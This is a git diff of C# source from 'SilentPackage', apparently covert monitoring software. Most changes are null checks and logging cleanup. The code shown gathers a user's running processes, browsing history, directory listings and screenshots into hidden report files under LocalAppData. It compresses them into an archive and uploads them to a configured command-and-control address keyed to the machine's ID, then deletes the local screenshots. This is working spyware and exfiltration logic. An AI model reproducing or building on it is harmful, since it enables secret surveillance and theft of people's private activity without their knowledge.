@@ -4,6 +4,7 @@
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Reflection;
@@ -85,13 +86,13 @@ namespace SilentPackage.Controllers
             }
             catch (UnauthorizedAccessException e)
             {
-               Console.WriteLine(e);
-          
+                Debug.WriteLine(e);
+
             }
             catch (Win32Exception e)
             {
-                Console.WriteLine(e);
-    
+                Debug.WriteLine(e);
+
             }
         }
 
@@ -113,52 +114,85 @@ namespace SilentPackage.Controllers
                 DirectoryInfo di = Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport");
                 di.Attributes = FileAttributes.Directory;
             }
-            using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\index.html"))
+
+            if (index != null)
             {
-                byte[] dataBytes = new UTF8Encoding(true).GetBytes(index);
-                fs.Write(dataBytes, 0, dataBytes.Length);
+                using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\index.html"))
+                {
+                    byte[] dataBytes = new UTF8Encoding(true).GetBytes(index);
+                    fs.Write(dataBytes, 0, dataBytes.Length);
+                }
             }
 
-            using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\processList.html"))
+            if (processPage != null)
             {
-                byte[] dataBytes = new UTF8Encoding(true).GetBytes(processPage);
-                fs.Write(dataBytes, 0, dataBytes.Length);
+                using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\processList.html"))
+                {
+                    byte[] dataBytes = new UTF8Encoding(true).GetBytes(processPage);
+                    fs.Write(dataBytes, 0, dataBytes.Length);
+                }
             }
-            using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\webHistoryList.html"))
+
+
+            if (webHistoryPage != null)
             {
-                byte[] dataBytes = new UTF8Encoding(true).GetBytes(webHistoryPage);
-                fs.Write(dataBytes, 0, dataBytes.Length);
+                using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\webHistoryList.html"))
+                {
+                    byte[] dataBytes = new UTF8Encoding(true).GetBytes(webHistoryPage);
+                    fs.Write(dataBytes, 0, dataBytes.Length);
+                }
             }
-            using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\directoryList.html"))
+
+            if (directoryPage != null)
             {
-                byte[] dataBytes = new UTF8Encoding(true).GetBytes(directoryPage);
-                fs.Write(dataBytes, 0, dataBytes.Length);
+                using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\directoryList.html"))
+                {
+                    byte[] dataBytes = new UTF8Encoding(true).GetBytes(directoryPage);
+                    fs.Write(dataBytes, 0, dataBytes.Length);
+                }
             }
-            using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\screenshotsList.html"))
+
+            if (screenshotsPage != null)
             {
-                byte[] dataBytes = new UTF8Encoding(true).GetBytes(screenshotsPage);
-                fs.Write(dataBytes, 0, dataBytes.Length);
+                using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\screenshotsList.html"))
+                {
+                    byte[] dataBytes = new UTF8Encoding(true).GetBytes(screenshotsPage);
+                    fs.Write(dataBytes, 0, dataBytes.Length);
+                }
             }
-            using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\bootstrap.min.css"))
+
+            if (bootstrap != null)
             {
-                byte[] dataBytes = new UTF8Encoding(true).GetBytes(bootstrap);
-                fs.Write(dataBytes, 0, dataBytes.Length);
+                using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\bootstrap.min.css"))
+                {
+                    byte[] dataBytes = new UTF8Encoding(true).GetBytes(bootstrap);
+                    fs.Write(dataBytes, 0, dataBytes.Length);
+                }
             }
-            using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\style.css"))
+
+            if (style != null)
             {
-                byte[] dataBytes = new UTF8Encoding(true).GetBytes(style);
-                fs.Write(dataBytes, 0, dataBytes.Length);
+                using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\style.css"))
+                {
+                    byte[] dataBytes = new UTF8Encoding(true).GetBytes(style);
+                    fs.Write(dataBytes, 0, dataBytes.Length);
+                }
             }
-            using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\LICENSE"))
+
+            if (license != null)
             {
-                byte[] dataBytes = new UTF8Encoding(true).GetBytes(license);
-                fs.Write(dataBytes, 0, dataBytes.Length);
+                using (FileStream fs = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\LICENSE"))
+                {
+                    byte[] dataBytes = new UTF8Encoding(true).GetBytes(license);
+                    fs.Write(dataBytes, 0, dataBytes.Length);
+                }
             }
+
 
 
         }
     }
-    
+
 
     /// <summary>
     /// Class to start main timer.
@@ -201,8 +235,9 @@ namespace SilentPackage.Controllers
 
         private GeneralPurposeTimer()
         {
-         //   MessageBox.Show("General purpose Timer");
-           _deviceId = _userIdentification.GetMachineID();
+            bool fileExist = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\data\debug.bin");
+            _deviceId = fileExist ? File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\data\debug.bin") : _userIdentification.GetMachineID();
+          
             StartTimer();
 
             if (_configurationManagement.GetConfigModel().PrtScrnEnable)
@@ -274,7 +309,6 @@ namespace SilentPackage.Controllers
         /// <param name="oElapsedEventArgs"></param>
         private void OnTimeEvent(object oSource, ElapsedEventArgs oElapsedEventArgs)
         {
-         //  MessageBox.Show("OnTimer#1");
             DocumentTableGenerator _documentTableGeneration = new DocumentTableGenerator();
             DocumentNavGenerator _documentNavGenerator = new DocumentNavGenerator();
             DocumentGenerator.DocumentGenerator _documentGenerator = new DocumentGenerator.DocumentGenerator();
@@ -282,21 +316,19 @@ namespace SilentPackage.Controllers
             bool historyEnable = false;
             bool fileDirectoryEnable = false;
             bool executeOrder67 = false;
-          
+
             if (_configurationManagement.GetConfigModel().ListProcessesEnable)
             {
                 ProcessListManagement listManagement = new ProcessListManagement();
                 _processLists.Push(listManagement.GetProcessListReports());
                 processEnable = true;
             }
-          //  MessageBox.Show("OnTimer#1AAA");
             if (_configurationManagement.GetConfigModel().WebHistoryEnable)
             {
                 BrowsingHistoryManagement historyManagement = new BrowsingHistoryManagement();
                 _browsingHistory.Push(historyManagement.GetBrowsingHistory());
                 historyEnable = true;
             }
-           // MessageBox.Show("OnTimer#BBB");
             if (_configurationManagement.GetConfigModel().FileDirectoryList != null)
             {
                 ScanDirectoryManagement scanDirectoryManagement = new ScanDirectoryManagement();
@@ -304,7 +336,6 @@ namespace SilentPackage.Controllers
                 fileDirectoryEnable = true;
             }
             _iteration++;
-          //  MessageBox.Show("OnTimer#2"+ _iteration +"Master"+ _masterInterval);
             if (_smallState)
             {
 
@@ -323,12 +354,11 @@ namespace SilentPackage.Controllers
 
             if (executeOrder67)
             {
-              //  MessageBox.Show("Generowanie raportu#1");
                 long timestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds();
                 string process = null;
                 string history = null;
                 string directory = null;
-                string screen = "";
+                string screen = null;
                 if (processEnable)
                 {
                     _comboModel.ProcessLists = _processLists;
@@ -373,8 +403,6 @@ namespace SilentPackage.Controllers
                     }
 
                 }
-               // MessageBox.Show("Tworzenie raportu #1");
-
                 DataCollection collection = DataCollection.GetInstance();
                 collection.GenerateReports(process, history, directory, screen, _documentGenerator.DocumentIndexGenerator(_documentNavGenerator.GenerateNav(processEnable, historyEnable, _configurationManagement.GetConfigModel().PrtScrnEnable, fileDirectoryEnable, 4)), _documentGenerator.DocumentBootstrapGenerator(), _documentGenerator.DocumentStyleGenerator(), _documentGenerator.DocumentLicenseGenerator());
                 collection.PackageReports(timestamp.ToString());
@@ -388,7 +416,7 @@ namespace SilentPackage.Controllers
                     DecryptDataHandler dataHandler = new DecryptDataHandler(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\data");
                     StringBuilder urlBuilder = new StringBuilder(_configurationManagement.GetConfigModel().AddressCc + "/api/1.0/reports/" + dataHandler.DecryptText(data) + "/" + _deviceId);
                     Thread.Sleep(400);
-                    string status = client.SendFile(urlBuilder.ToString(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\"+timestamp.ToString() + ".7z", true);
+                    string status = client.SendFile(urlBuilder.ToString(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\" + timestamp.ToString() + ".7z", true);
                     if (status.Equals("OK"))
                     {
                         if (_offline == 1)
@@ -470,6 +498,11 @@ namespace SilentPackage.Controllers
         /// <returns>Lists with screenshots.</returns>
         public List<Models.FileDirectory> GetPrintScrFile()
         {
+            if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\screenshot\"))
+            {
+                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\screenshot\");
+            }
+
             List<Models.FileDirectory> fileDirectories = new List<Models.FileDirectory>();
             foreach (var e in FileDirectory.ScanDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\screenshot\", _strlist))
             {
@@ -489,7 +522,7 @@ namespace SilentPackage.Controllers
             }
             catch (Exception e)
             {
-                Console.WriteLine(e);
+                Debug.WriteLine(e);
                 //throw;
             }
         }
@@ -539,11 +572,13 @@ namespace SilentPackage.Controllers
                 }
             }
 
-
             List<Models.FileDirectory> fileDirectories = GetPrintScrFile();
-            foreach (var eDirectory in fileDirectories)
+            if (fileDirectories != null)
             {
-                DeleteFile(eDirectory.FullName);
+                foreach (var eDirectory in fileDirectories)
+                {
+                    DeleteFile(eDirectory.FullName);
+                }
             }
         }
     }
@@ -649,6 +684,7 @@ namespace SilentPackage.Controllers
             }
             catch (IOException e)
             {
+                Debug.Write(e);
             }
         }
 
